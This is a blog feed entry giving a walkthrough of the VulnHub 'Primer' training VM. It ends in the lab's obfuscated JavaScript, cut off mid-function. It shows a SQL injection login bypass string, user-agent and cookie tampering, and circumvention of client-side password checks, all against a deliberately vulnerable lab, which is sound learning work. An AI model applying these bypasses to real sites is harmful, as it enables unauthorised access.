<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: security | Core dump overflow]]></title>
  <link href="http://chousensha.github.io/blog/categories/security/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2016-03-11T07:06:38-05:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Primer]]></title>
    <link href="http://chousensha.github.io/blog/2016/03/11/pentest-lab-primer/"/>
    <updated>2016-03-11T06:56:18-05:00</updated>
    <id>http://chousensha.github.io/blog/2016/03/11/pentest-lab-primer</id>
    <content type="html"><![CDATA[<p>I&rsquo;ve decided to try a VM named Primer that was recently added to VulnHub. I was hooked by the description of it being a story driven VM that was inspired by William Gibson&rsquo;s Spraw Trilogy, which was one of my first reads in hacking literature, after I became interested in the subject! And it also provided me with a new novel to read, since I didn&rsquo;t know about Snow Crash:</p>

<blockquote><p>Concept</p>

<p>This is a story based challenge written in a style heavily inspired by Neil Stephensons Snow Crash and William Gibsons Sprawl Trilogy. Each
chapter is unlocked by solving the puzzle. From hardcoded clear text javascript password checks, SQL-injections and cracking hashes to a
simulated terminal. You only need to start the VM, a webserver will come up and you can connect with your browser. In fact you never have to
leave the browser.</p>

<p>Goal</p>

<p>Teach some basic well known techniques and attacks. Spark some curiosity, make the user look at the source code and try to figure out what&rsquo;s
going on behind the scenes. The main goal is to give a nice welcoming intro to the scene and hopefully also teach something about ethics and
responsibility.</p></blockquote>

<!-- more -->


<p>After you determine the IP address of the VM, point your browser to it and you will be greeted by this:</p>

<p><img class="center" src="/images/pentest/primer/primer_level1.png" title="&lsquo;primer level 1&rsquo; &lsquo;primer level 1&rsquo;" ></p>

<p>Read the story, it&rsquo;s a nice way to get you immersed in the challenge, and it also contains hints for solving the level.</p>

<p>Looking in the source, I saw this:</p>

<p><code>plain
Some f0rms are easier than others.
This one was just a means to get to the next level so there was no need for her to apply her full set of skills or fake credentials. Manufacturing a bo0le4n response would probably be enaugh to let her pass.
</code></p>

<p>Well then, following the hint, I used a classic SQLi string that would be evaluated as True: <code>yo &lsquo;or 1=1&mdash; </code></p>

<p><img class="center" src="/images/pentest/primer/primer_level2.png" title="&lsquo;primer level 2&rsquo; &lsquo;primer level 2&rsquo;" ></p>

<p>The description points to the user agent, and when checking the source again, we can see a comment stating exactly what we need to fool the bot:</p>

<p><code>plain
This bot was looking for a SosÅ« User Agent Identifier she had cracked weeks ago, easy sauce, just a simple md5 hash of the first 7 digits of
pi. It was basically common knowledge to the entities moving in these areas but obscurity does create a, albeit virtual, layer of security.
</code></p>

<p>Ok..I took the first 7 digits of Pi (3.141592) and converted them to MD5, getting the string <em>d483d00d07fcc80319d170ccf07fb5be</em>. Then I changed my user agent to this string, and bam!</p>

<p><img class="center" src="/images/pentest/primer/primer_level3.png" title="&lsquo;primer level 3&rsquo; &lsquo;primer level 3&rsquo;" ></p>

<p>This time there is no hint in the source, but reading the plot description made me think about cookies, and I discovered an activeSession cookie with a value of false. Now let&rsquo;s see what happens if I change it to true..</p>

<p>Reloaded the page..and!</p>

<p><img class="center" src="/images/pentest/primer/primer_level4.png" title="&lsquo;primer level 4&rsquo; &lsquo;primer level 4&rsquo;" ></p>

<p>I almost missed the hint hidden inside the <code><head></code> tag:</p>

<p><code>html
&lt;meta http-equiv="hint" content="Think, but don't act like a robot." /&gt;
</code>
This made me check if there is a robots.txt file, and there I found the next piece of the puzzle!</p>

<p><code>plain
User-agent: *
Disallow: /4_8f14e45fceea167a5a36dedd4bea2543
</code></p>

<p><img class="center" src="/images/pentest/primer/primer_level5.png" title="&lsquo;primer level 5&rsquo; &lsquo;primer level 5&rsquo;" ></p>

<p>Clicking the thing on this page that stands out will take you elsewhere.. :) you can see in the source exactly where:</p>

<p>``` html</p>

<h1><a href="../5_6512bd43d9caa6e02c990b0a82652dca">[EOF]</a></h1>


<p>```</p>

<p><img class="center" src="/images/pentest/primer/primer_level6.png" title="&lsquo;primer level 6&rsquo; &lsquo;primer level 6&rsquo;" ></p>

<p>So, the character in the story seems to be getting more and more familiar..:D Now, let&rsquo;s go to the place that smells like a trap, and see what awaits us there!</p>

<p><img class="center" src="/images/pentest/primer/primer_level7.png" title="&lsquo;primer level 7&rsquo; &lsquo;primer level 7&rsquo;" ></p>

<p>You can see the page keeps reloading and you can&rsquo;t right-click to view the source..but there are other ways! First, I entered something in the box to see what would happen:</p>

<p><img class="center" src="/images/pentest/primer/beware.png" title="&lsquo;beware&rsquo; &lsquo;beware&rsquo;" ></p>

<p>Yikes! Who knows what horrible thing we have disturbed! Better complete the rest fast! I looked at the source of the page with the <code>view-source</code> command:</p>

<p><code>plain
view-source:http://192.168.80.149/6_c51ce410c124a10e0db5e4b97fc2af39/
</code></p>

<p>There is a Javascript code that decides the redirection when entering something in the box. Let&rsquo;s look at it:</p>

<p><code>js
var X;
var L="Ikdf076";
X=prompt('/()=','');
if (X === null){window.location = "./_.php";}
if (X.substr(2,7) == L){}
else {window.location = "./_.php";}
</code></p>

<p>The only way not to get..noticed, is to enter something that would match <em>substr()</em> method. <a href="http://www.w3schools.com/jsref/jsref_substr.asp">This method</a> extracts parts of a string, beginning at the character at the specified position, and returns the specified number of characters. So the code is looking in our input for the string Ikdf076 starting at the third character. I entered 00Ikdf076 and penetrated deeper into the intranet!</p>

<p><img class="center" src="/images/pentest/primer/primer_level7b.png" title="&lsquo;primer level 7&rsquo; &lsquo;primer level 7&rsquo;" ></p>

<p>Moving further, looks like another reloading page.</p>

<p><img class="center" src="/images/pentest/primer/primer_level8.png" title="&lsquo;primer level 8&rsquo; &lsquo;primer level 8&rsquo;" ></p>

<p>Reading the source, there is another script that we have to decipher:</p>

<p>``` js</p>

<SCRIPT language="JavaScript">
var _0x5cf4=["","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x63\x68\x61\x72\x43\x6F\x64\x65\x41\x74","\x73\x70\x6C\x69\x74","\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x61\x62\x63\x64\x65\x66","\x6A\x6F\x69\x6E","\x68\x65\x6C\x6C\x6F","\x35\x64\x34\x31\x34\x30\x32\x61\x62\x63\x34\x62\x32\x61\x37\x36\x62\x39\x37\x31\x39\x64\x39\x31\x31\x30\x31\x37\x63\x35\x39\x32","\x30\x64\x32\x38\x63\x62\x61\x30\x62\x64\x34\x66\x32\x36\x65\x31\x36\x64\x37\x36\x36\x30\x30\x30\x64\x32\x37\x65\x34\x39\x66\x61","\xA7\x23\x2F\x24","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x2E\x2F\x5F\x2E\x70\x68\x70","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x6C\x6F\x61\x64\x69\x6E\x67","\x44\x4F\x4D\x43\x6F\x6E\x74\x65\x6E\x74\x4C\x6F\x61\x64\x65\x64","\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72","\x20\x20\x20\x20\x3C\x63\x65\x6E\x74\x65\x72\x3E\x20\x20\x20\x20\x20\x20\x3C\x68\x31\x3E\x5B\x2B\x2B\x51\x2B\x2B\x2B\x2B\x2B\x2B\x5D\x3C\x2F\x68\x31\x3E\x20\x20\x20\x20\x3C\x2F\x63\x65\x6E\x74\x65\x72\x3E\x20\x20\x20\x20\x3C\x70\x3E\x20\x20\x20\x20\x20\x20\x53\x68\x65\x20\x77\x61\x73\x20\x6E\x6F\x20\x6C\x6F\x6E\x67\x65\x72\x20\x73\x75\x72\x65\x20\x77\x68\x61\x74\x20\x68\x65\x72\x20\x6F\x72\x69\x67\x69\x6E\x61\x6C\x20\x61\x73\x73\x69\x67\x6E\x6D\x65\x6E\x74\x20\x68\x61\x64\x20\x62\x65\x65\x6E\x2E\x20\x42\x75\x74\x20\x69\x74\x20\x64\x69\x64\x6E\x27\x74\x20\x6D\x61\x74\x74\x65\x72\x20\x61\x6E\x79\x77\x61\x79\x2E\x20\x57\x68\x61\x74\x20\x73\x74\x69\x6C\x6C\x20\x6D\x61\x74\x74\x65\x72\x65\x64\x20\x77\x61\x73\x20\x67\x65\x74\x74\x69\x6E\x67\x20\x6F\x75\x74\x20\x6F\x66\x20\x68\x65\x72\x65\x2C\x20\x61\x6C\x69\x76\x65\x2E\x20\x20\x20\x20\x20\x20\x4C\x6F\x67\x20\x6F\x75\x74\x2C\x20\x74\x65\x6C\x6C\x20\x74\x68\x65\x20\x63\x6C\x69\x65\x6E\x74\x20\x74\x6F\x20\x67\x6F\x20\x66\x75\x63\x6B\x20\x68\x69\x6D\x73\x65\x6C\x66\x20\x61\x6E\x64\x20\x67\x65\x74\x20\x61\x20\x66\x69\x78\x20\x6F\x66\x20\x6E\x30\x69\x73\x65\x20\x74\x6F\x20\x73\x68\x75\x74\x20\x6F\x66\x66\x20\x68\x65\x72\x20\x6D\x69\x6E\x64\x2E\x20\x52\x65\x6C\x61\x78\x20\x77\x69\x74\x68\x20\x61\x20\x6D\x69\x6E\x64\x6C\x65\x73\x73\x20\x68\x6F\x6C\x6F\x20\x66\x6C\x69\x63\x6B\x20\x61\x6E\x64\x20\x6E\x65\x76\x65\x72\x20\x6C\x6F\x6F\x6B\x20\x62\x61\x63\x6B\x20\x61\x74\x20\x74\x68\x69\x73\x20\x77\x65\x69\x72\x64\x20\x6A\x6F\x62\x2E\x20\x20\x20\x20\x3C\x2F\x70\x3E\x20\x20\x20\x20\x3C\x70\x3E\x20\x20\x20\x20\x20\x20\x41\x20\x76\x69\x6F\x6C\x65\x6E\x74\x20\x6E\x65\x6F\x6E\x20\x66\x6C\x69\x63\x6B\x65\x72\x20\x61\x70\x70\x65\x61\x72\x65\x64\x20\x61\x74\x20\x74\x68\x65\x20\x68\x6F\x72\x69\x7A\x6F\x6E\x2E\x20\x4E\x6F\x20\x74\x68\x75\x6E\x64\x65\x72\x20\x66\x6F\x6C\x6C\x6F\x77\x65\x64\x2E\x3C\x62\x72\x3E\x20\x20\x20\x20\x20\x20\x53\x68\x65\x20\x73\x74\x61\x72\x65\x64\x20\x69\x6E\x20\x74\x68\x65\x20\x64\x69\x73\x74\x61\x6E\x63\x65\x20\x77\x69\x74\x68\x20\x61\x20\x62\x6C\x61\x6E\x6B\x20\x65\x78\x70\x72\x65\x73\x73\x69\x6F\x6E\x2E\x20\x20\x20\x20\x3C\x2F\x70\x3E\x20\x20\x20\x20\x3C\x70\x3E\x20\x20\x20\x20\x20\x20\x22\x48\x65\x6C\x6C\x6F\x2C\x20\x4E\x69\x65\x76\x65\x2E\x22\x20\x41\x20\x64\x65\x65\x70\x2C\x20\x66\x65\x6D\x69\x6E\x69\x6E\x65\x2C\x20\x64\x69\x67\x69\x74\x61\x6C\x20\x76\x6F\x69\x63\x65\x20\x72\x6F\x61\x72\x65\x64\x20\x69\x6E\x20\x68\x65\x72\x20\x68\x65\x61\x64\x2E\x3C\x62\x72\x3E\x20\x20\x20\x20\x20\x20\x46\x55\x43\x4B\x21\x20\x54\x68\x69\x73\x20\x77\x61\x73\x20\x68\x65\x72\x20\x72\x65\x61\x6C\x20\x6E\x61\x6D\x65\x2E\x20\x53\x68\x65\x20\x68\x61\x64\x6E\x27\x74\x20\x75\x73\x65\x64\x20\x69\x74\x20\x69\x6E\x20\x79\x65\x61\x72\x73\x2E\x2E\x2E\x20\x20\x20\x20\x3C\x2F\x70\x3E\x20\x20\x20\x20\x3C\x70\x3E\x20\x20\x20\x20\x20\x20\x22\x49\x20\x77\x69\x6C\x6C\x20\x6C\x6F\x67\x6F\x75\x74\x20\x61\x6E\x64\x20\x73\x74\x6F\x70\x20\x74\x68\x69\x73\x20\x73\x68\x69\x74\x20\x72\x69\x67\x68\x74\x20\x66\x75\x63\x6B\x69\x6E\x67\x20\x6E\x6F\x77\x21\x22\x20\x53\x68\x65\x20\x73\x63\x72\x65\x61\x6D\x65\x64\x20\x69\x6E\x74\x6F\x20\x74\x68\x65\x20\x6E\x65\x6F\x6E\x20\x65\x78\x70\x61\x6E\x73\x65\x2E\x3C\x62\x72\x3E\x20\x20\x20\x20\x20\x20\x4E\x6F\x74\x68\x69\x6E\x67\x2E\x20\x20\x20\x20\x3C\x2F\x70\x3E\x20\x20\x20\x20\x3C\x70\x3E\x20\x20\x20\x20\x20\x20\x53\x68\x65\x20\x64\x69\x64\x6E\x27\x74\x2E\x20\x53\x6F\x6D\x65\x74\x68\x69\x6E\x67\x20\x62\x65\x73\x69\x64\x65\x20\x74\x68\x65\x20\x66\x65\x61\x72\x20\x6F\x63\x63\x75\x70\x69\x65\x64\x20\x68\x65\x72\x20\x6D\x69\x6E\x64\x2E\x20\x49\x74\x20\x68\x61\x64\x20\x62\x65\x65\x6E\x20\x74\x68\x65\x72\x65\x20\x73\x69\x6E\x63\x65\x20\x74\x68\x65\x20\x73\x65\x63\x6F\x6E\x64\x20\x6E\x6F\x64\x65\x20\x61\x6E\x64\x20\x67\x72\x65\x77\x20\x73\x74\x72\x6F\x6E\x67\x65\x72\x20\x77\x69\x74\x68\x20\x65\x76\x65\x72\x79\x20\x6D\x6F\x76\x65\x2E\x20\x54\x68\x65\x72\x65\x20\x77\x61\x73\x20\x61\x20\x70\x61\x74\x74\x65\x72\x6E\x20\x69\x6E\x20\x74\x68\x65\x20\x70\x61\x74\x68\x20\x73\x68\x65\x20\x68\x61\x64\x20\x74\x61\x6B\x65\x6E\x20\x74\x68\x72\x6F\x75\x67\x68\x20\x74\x68\x65\x20\x6E\x65\x74\x77\x6F\x72\x6B\x2E\x20\x41\x6E\x20\x61\x72\x74\x69\x66\x69\x63\x69\x61\x6C\x20\x70\x61\x74\x74\x65\x72\x6E\x2C\x20\x6C\x61\x79\x65\x64\x20\x6F\x75\x74\x20\x62\x79\x20\x73\x6F\x6D\x65\x6F\x6E\x65\x20\x6F\x72\x20\x73\x6F\x6D\x65\x74\x68\x69\x6E\x67\x2E\x3C\x62\x72\x3E\x20\x20\x20\x20\x20\x20\x54\x68\x65\x72\x65\x20\x77\x61\x73\x20\x6E\x6F\x20\x68\x69\x6E\x74\x2C\x20\x6E\x6F\x20\x6F\x62\x76\x69\x6F\x75\x73\x20\x73\x74\x65\x70\x2E\x20\x46\x69\x6E\x64\x69\x6E\x67\x20\x74\x68\x65\x20\x6E\x65\x78\x74\x20\x6E\x6F\x64\x65\x20\x77\x6F\x75\x6C\x64\x20\x62\x65\x20\x74\x68\x65\x20\x63\x68\x61\x6C\x6C\x65\x6E\x67\x65\x2C\x20\x6F\x72\x20\x6D\x61\x79\x62\x65\x20\x6D\x6F\x72\x65\x20\x6C\x69\x6B\x65\x20\x61\x20\x74\x65\x73\x74\x2E\x20\x20\x20\x20\x3C\x2F\x70\x3E","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x66\x6F\x6F","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64"];
  
  /*"Someone didn't bother reading my carefully prepared memo on commonly-used passwords. Now, then, as I so meticulously pointed out, the four most-used passwords are: love, sex, secret, and..." - The Plague*/
  
function md5cycle(_0xf6a0x2,_0xf6a0x3){var _0xf6a0x4=_0xf6a0x2[0],_0xf6a0x5=_0xf6a0x2[1],_0xf6a0x6=_0xf6a0x2[2],_0xf6a0x7=_0xf6a0x2[3];_0xf6a0x4=ff(_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x3[0],7,-680876936);_0xf6a0x7=ff(_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x3[1],12,-389564586);_0xf6a0x6=ff(_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x3[2],17,606105819);_0xf6a0x5=ff(_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x3[3],22,-1044525330);_0xf6a0x4=ff(_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x3[4],7,-176418897);_0xf6a0x7=ff(_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x3[5],12,1200080426);_0xf6a0x6=ff(_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x3[6],17,-1473231341);_0xf6a0x5=ff(_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x3[7],22,-45705983);_0xf6a0x4=ff(_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x3[8],7,1770035416);_0xf6a0x7=ff(_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x3[9],12,-1958414417);_0xf6a0x6=ff(_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x3[10],17,-42063);_0xf6a0x5=ff(_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x3[11],22,-1990404162);_0xf6a0x4=ff(_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x3[12],7,1804603682);_0xf6a0x7=ff(_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x3[13],12,-40341101);_0xf6a0x6=ff(_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x3[14],17,-1502002290);_0xf6a0x5=ff(_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x3[15],22,1236535329);_0xf6a0x4=gg(_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x3[1],5,-165796510);_0xf6a0x7=gg(_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x3[6],9,-1069501632);_0xf6a0x6=gg(_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x3[11],14,643717713);_0xf6a0x5=gg(_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x3[0],20,-373897302);_0xf6a0x4=gg(_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x3[5],5,-701558691);_0xf6a0x7=gg(_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x3[10],9,38016083);_0xf6a0x6=gg(_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x3[15],14,-660478335);_0xf6a0x5=gg(_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x3[4],20,-405537848);_0xf6a0x4=gg(_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x3[9],5,568446438);_0xf6a0x7=gg(_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x3[14],9,-1019803690);_0xf6a0x6=gg(_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x3[3],14,-187363961);_0xf6a0x5=gg(_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x3[8],20,1163531501);_0xf6a0x4=gg(_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x3[13],5,-1444681467);_0xf6a0x7=gg(_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x3[2],9,-51403784);_0xf6a0x6=gg(_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x3[7],14,1735328473);_0xf6a0x5=gg(_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x3[12],20,-1926607734);_0xf6a0x4=hh(_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x3[5],4,-378558);_0xf6a0x7=hh(_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x3[8],11,-2022574463);_0xf6a0x6=hh(_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x3[11],16,1839030562);_0xf6a0x5=hh(_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x3[14],23,-35309556);_0xf6a0x4=hh(_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x3[1],4,-1530992060);_0xf6a0x7=hh(_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x3[4],11,1272893353);_0xf6a0x6=hh(_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x3[7],16,-155497632);_0xf6a0x5=hh(_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x3[10],23,-1094730640);_0xf6a0x4=hh(_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x3[13],4,681279174);_0xf6a0x7=hh(_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x3[0],11,-358537222);_0xf6a0x6=hh(_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x3[3],16,-722521979);_0xf6a0x5=hh(_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x3[6],23,76029189);_0xf6a0x4=hh(_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x3[9],4,-640364487);_0xf6a0x7=hh(_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x3[12],11,-421815835);_0xf6a0x6=hh(_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x3[15],16,530742520);_0xf6a0x5=hh(_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x3[2],23,-995338651);_0xf6a0x4=ii(_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x3[0],6,-198630844);_0xf6a0x7=ii(_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x3[7],10,1126891415);_0xf6a0x6=ii(_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x3[14],15,-1416354905);_0xf6a0x5=ii(_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x3[5],21,-57434055);_0xf6a0x4=ii(_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x3[12],6,1700485571);_0xf6a0x7=ii(_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x3[3],10,-1894986606);_0xf6a0x6=ii(_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x3[10],15,-1051523);_0xf6a0x5=ii(_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x3[1],21,-2054922799);_0xf6a0x4=ii(_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x3[8],6,1873313359);_0xf6a0x7=ii(_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x3[15],10,-30611744);_0xf6a0x6=ii(_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x3[6],15,-1560198380);_0xf6a0x5=ii(_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x3[13],21,1309151649);_0xf6a0x4=ii(_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x3[4],6,-145523070);_0xf6a0x7=ii(_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x3[11],10,-1120210379);_0xf6a0x6=ii(_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x3[2],15,718787259);_0xf6a0x5=ii(_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x4,_0xf6a0x3[9],21,-343485551);_0xf6a0x2[0]=add32(_0xf6a0x4,_0xf6a0x2[0]);_0xf6a0x2[1]=add32(_0xf6a0x5,_0xf6a0x2[1]);_0xf6a0x2[2]=add32(_0xf6a0x6,_0xf6a0x2[2]);_0xf6a0x2[3]=add32(_0xf6a0x7,_0xf6a0x2[3]);}function cmn(_0xf6a0x9,_0xf6a0x4,_0xf6a0x5,_0xf6a0x2,_0xf6a0xa,_0xf6a0xb){_0xf6a0x4=add32(add32(_0xf6a0x4,_0xf6a0x9),add32(_0xf6a0x2,_0xf6a0xb));return add32((_0xf6a0x4<<_0xf6a0xa)|(_0xf6a0x4>>>(32-_0xf6a0xa)),_0xf6a0x5);}function ff(_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x2,_0xf6a0xa,_0xf6a0xb){return cmn((_0xf6a0x5&_0xf6a0x6)|((~_0xf6a0x5)&_0xf6a0x7),_0xf6a0x4,_0xf6a0x5,_0xf6a0x2,_0xf6a0xa,_0xf6a0xb)}function gg(_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x2,_0xf6a0xa,_0xf6a0xb){return cmn((_0xf6a0x5&_0xf6a0x7)|(_0xf6a0x6&(~_0xf6a0x7)),_0xf6a0x4,_0xf6a0x5,_0xf6a0x2,_0xf6a0xa,_0xf6a0xb)}function hh(_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x2,_0xf6a0xa,_0xf6a0xb){return cmn(_0xf6a0x5^_0xf6a0x6^_0xf6a0x7,_0xf6a0x4,_0xf6a0x5,_0xf6a0x2,_0xf6a0xa,_0xf6a0xb)}function ii(_0xf6a0x4,_0xf6a0x5,_0xf6a0x6,_0xf6a0x7,_0xf6a0x2,_0xf6a0xa,_0xf6a0xb){return cmn(_0xf6a0x6^(_0xf6a0x5|(~_0xf6a0x7)),_0xf6a0x4,_0xf6a0x5,_0xf6a0x2,_0xf6a0xa,_0xf6a0xb)}function md51(_0xf6a0xa){txt=_0x5cf4[0];var _0xf6a0x11=_0xf6a0xa[_0x5cf4[1]],_0xf6a0x12=[1732584193,-271733879,-1732584194,271733878],_0xf6a0x13;for(_0xf6a0x13=64;_0xf6a0x13<=_0xf6a0xa[_0x5cf4[1]];_0xf6a0x13+=64){md5cycle(_0xf6a0x12,md5blk(_0xf6a0xa[_0x5cf4[2]](_0xf6a0x13-64,_0xf6a0x13)))};_0xf6a0xa=_0xf6a0xa[_0x5cf4[2]](_0xf6a0x13-64);var _0xf6a0x14=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0];for(_0xf6a0x13=0;_0xf6a0x13<_0xf6a0xa[_0x5cf4[1]];_0xf6a0x13++){_0xf6a0x14[_0xf6a0x13>>2]|=_0xf6a0xa[_0x5cf4[3]](_0xf6a0x13)<<((_0xf6a0x13%4)<<3)};_0xf6a0x14[_0xf6a0x13>>2]|=0x80<<((_0xf6a0x13%4)<<3);if(_0xf6a0x13>55){md5cycle(_0xf6a0x12,_0xf6a0x14);for(_0xf6a0x13=0;_0xf6a0x13<16;_0xf6a0x13++){_0xf6a0x14[_0xf6a0x13]=0};};_0xf6a0x14[14]=_0xf6a0x11*8;md5cycle(_0xf6a0x12,_0xf6a0x14);return _0xf6a0x12;}function md5blk(_0xf6a0xa){var _0xf6a0x16=[],_0xf6a0x13;for(_0xf6a0x13=0;_0xf6a0x13<64;_0xf6a0x13+=4){_0xf6a0x16[_0xf6a0x13>>2]=_0xf6a0xa[_0x5cf4[3]](_0xf6a0x13)+(_0xf6a0xa[_0x5cf4[3]](_0xf6a0x13+1)<<8)+(_0xf6a0xa[_0x5cf4[3]](_0xf6a0x13+2)<<16)+(_0xf6a0xa[_0x5cf4[3]](_0xf6a0x13+3)<<24)};return _0xf6a0x16;}var hex_chr=_0x5cf4[5][_0x5cf4[4]](_0x5cf4[0]);function rhex(_0xf6a0x11){var _0xf6a0xa=_0x5cf4[0],_0xf6a0x19=0;for(;_0xf6a0x19<4;_0xf6a0x19++){_0xf6a0xa+=hex_chr[(_0xf6a0x11>>(_0xf6a0x19*8+4))&0x0F]+hex_chr[(_0xf6a0x11>>(_0xf6a0x19*8))&0x0F]};return _0xf6a0xa;}function hex(_0xf6a0x2){for(var _0xf6a0x13=0;_0xf6a0x13<_0xf6a0x2[_0x5cf4[1]];_0xf6a0x13++){_0xf6a0x2[_0xf6a0x13]=rhex(_0xf6a0x2[_0xf6a0x13])};return _0xf6a0x2[_0x5cf4[6]](_0x5cf4[0]);}function md5(_0xf6a0xa){return hex(md51(_0xf6a0xa))}function add32(_0xf6a0x4,_0xf6a0x5){return (_0xf6a0x4+_0xf6a0x5)&0xFFFFFFFF}if(md5(_0x5cf4[7])!=_0x5cf4[8]){function add32(_0xf6a0x2,_0xf6a0x1d){var _0xf6a0x1e=(_0xf6a0x2&0xFFFF)+(_0xf6a0x1d&0xFFFF),_0xf6a0x1f=(_0xf6a0x2>>16)+(_0xf6a0x1d>>16)+(_0xf6a0x1e>>16);return 